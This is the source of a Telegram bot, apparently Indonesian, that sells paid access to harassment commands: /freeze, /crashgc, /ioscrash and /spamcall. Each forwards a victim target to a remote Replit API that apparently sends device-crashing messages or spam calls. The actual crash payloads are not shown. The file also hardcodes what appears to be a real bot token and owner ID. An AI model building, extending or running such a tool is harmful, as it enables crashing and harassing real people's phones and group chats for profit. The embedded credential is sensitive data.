const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');

// Ganti dengan token bot Anda
const token = '7369864650:AAFQlH1AMegud5Lvg4h8KQiHzXrcqLbwb9o';

// Ganti dengan URL awal
const url = 'https://7b234afa-872b-4be4-8fbc-4a20b8dc97b8-00-1yor3tnzx7pyo.spock.replit.dev';

// ID Telegram owner
const ownerId = 6641413945;

// Simpan daftar user yang diberi akses
let accessList = [];

// Buat bot
const bot = new TelegramBot(token, { polling: true });

// Fungsi untuk memeriksa akses
const hasAccess = (userId) => accessList.includes(userId);

// Fungsi untuk menambahkan akses
const addAccess = (userId) => {
    if (!accessList.includes(userId)) {
        accessList.push(userId);
    }
};

// Fungsi untuk menghapus akses
const removeAccess = (userId) => {
    accessList = accessList.filter(id => id !== userId);
};

// Command: /start
bot.onText(/\/start/, (msg) => {
    const helpMessage = `
Daftar Command:
- /freeze <target>
- /crashgc <target>
- /ioscrash <target>
- /spamcall <target>
- /addaccess <user_id>
- /removeaccess <user_id>
- /listaccess
    `;
    bot.sendMessage(msg.chat.id, helpMessage);
});

// Command: /freeze
bot.onText(/\/freeze (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const target = match[1];

    if (!hasAccess(userId)) {
        return bot.sendMessage(chatId, 'Kamu tidak memiliki akses menggunakan bot ini. Silahkan beli akses ke @diisum');
    }

    if (!target) {
        return bot.sendMessage(chatId, 'Mau kirim kemana?');
    }

    try {
        const response = await axios.get(`${url}/freezeDroid?target=${target}`);
        bot.sendMessage(chatId, `Request berhasil: ${response.data}`);
    } catch (error) {
        bot.sendMessage(chatId, 'Api endpoint error.');
    }
});

// Command: /crashgc
bot.onText(/\/crashgc (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const target = match[1];

    if (!hasAccess(userId)) {
        return bot.sendMessage(chatId, 'Kamu tidak memiliki akses menggunakan bot ini. Silahkan beli akses ke @diisum');
    }

    if (!target) {
        return bot.sendMessage(chatId, 'Mau kirim kemana?');
    }

    try {
        const response = await axios.get(`${url}/crashGroup?target=${target}`);
        bot.sendMessage(chatId, `Request berhasil: ${response.data}`);
    } catch (error) {
        bot.sendMessage(chatId, 'Api endpoint error.');
    }
});

// Command: /ioscrash
bot.onText(/\/ioscrash (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const target = match[1];

    if (!hasAccess(userId)) {
        return bot.sendMessage(chatId, 'Kamu tidak memiliki akses menggunakan bot ini. Silahkan beli akses ke @diisum');
    }

    if (!target) {
        return bot.sendMessage(chatId, 'Mau kirim kemana?');
    }

    try {
        const response = await axios.get(`${url}/iosCrash?target=${target}`);
        bot.sendMessage(chatId, `Request berhasil: ${response.data}`);
    } catch (error) {
        bot.sendMessage(chatId, 'Api endpoint error.');
    }
});

// Command: /spamcall
bot.onText(/\/spamcall (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const target = match[1];

    if (!hasAccess(userId)) {
        return bot.sendMessage(chatId, 'Kamu tidak memiliki akses menggunakan bot ini. Silahkan beli akses ke @diisum');
    }

    if (!target) {
        return bot.sendMessage(chatId, 'Mau kirim kemana?');
    }

    try {
        const response = await axios.get(`${url}/callSpam?target=${target}`);
        bot.sendMessage(chatId, `Request berhasil: ${response.data}`);
    } catch (error) {
        bot.sendMessage(chatId, 'Api endpoint error.');
    }
});

// Command: /addaccess
bot.onText(/\/addaccess (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (userId !== ownerId) {
        return bot.sendMessage(chatId, 'Hanya owner yang dapat menambahkan akses.');
    }

    const newUserId = parseInt(match[1]);
    addAccess(newUserId);
    bot.sendMessage(chatId, `User ID ${newUserId} telah diberi akses.`);
});

// Command: /removeaccess
bot.onText(/\/removeaccess (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (userId !== ownerId) {
        return bot.sendMessage(chatId, 'Hanya owner yang dapat menghapus akses.');
    }

    const removeUserId = parseInt(match[1]);
    removeAccess(removeUserId);
    bot.sendMessage(chatId, `User ID ${removeUserId} telah dihapus dari daftar akses.`);
});

// Command: /listaccess
bot.onText(/\/listaccess/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (userId !== ownerId) {
        return bot.sendMessage(chatId, 'Hanya owner yang dapat melihat daftar akses.');
    }

    if (accessList.length === 0) {
        return bot.sendMessage(chatId, 'Tidak ada user yang diberi akses.');
    }

    bot.sendMessage(chatId, `Daftar user dengan akses:\n${accessList.join('\n')}`);
});